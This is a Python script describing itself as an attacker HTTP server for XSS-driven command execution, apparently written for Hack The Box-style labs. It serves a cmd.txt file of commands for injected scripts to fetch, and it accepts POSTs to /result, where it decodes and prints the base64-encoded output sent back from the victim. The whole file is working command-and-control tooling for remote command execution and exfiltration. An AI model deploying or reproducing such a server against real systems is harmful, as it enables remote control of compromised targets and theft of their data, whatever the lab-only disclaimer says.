#!/usr/bin/env python3
"""
Simple attacker HTTP server for XSS-driven command execution.

Usage:
  python tools/xss_rev_server.py --host 0.0.0.0 --port 5000

Behavior:
- Serves `/cmd.txt` from the current working directory if present (plain text).
- Accepts POST to `/result` and prints base64-decoded payloads to stdout.

This is intentionally minimal and meant for local lab use only (HTB/labs).
"""
import http.server
import socketserver
import argparse
import urllib.parse
import base64
import os


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path == '/cmd.txt':
            try:
                with open('cmd.txt', 'rb') as f:
                    data = f.read()
            except FileNotFoundError:
                data = b''
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Length', str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            return

        # simple page for manual checks
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body>OK</body></html>')

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if path == '/result':
            length = int(self.headers.get('Content-Length', 0))
            raw = self.rfile.read(length)
            try:
                parsed = urllib.parse.parse_qs(raw.decode(), keep_blank_values=True)
            except Exception:
                parsed = {}

            out_b64 = None
            for key in ('out', 'result', 'output'):
                if key in parsed and parsed[key]:
                    out_b64 = parsed[key][0]
                    break

            if out_b64 is None:
                # if not form-encoded, treat the raw body as base64
                try:
                    out_b64 = raw.decode()
                except Exception:
                    out_b64 = ''

            try:
                decoded = base64.b64decode(out_b64)
                print('\n---- REMOTE OUTPUT ----')
                print(decoded.decode(errors='replace'))
                print('---- END REMOTE OUTPUT ----\n')
            except Exception as e:
                print('Received result but failed to decode base64:', e)
                print('Raw payload:', out_b64)

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.send_response(404)
            self.end_headers()


def run(host, port):
    with socketserver.ThreadingTCPServer((host, port), Handler) as httpd:
        httpd.allow_reuse_address = True
        print(f'Serving on http://{host}:{port} (CTRL-C to stop)')
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print('\nStopping server')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='0.0.0.0')
    parser.add_argument('--port', type=int, default=5000)
    args = parser.parse_args()
    run(args.host, args.port)
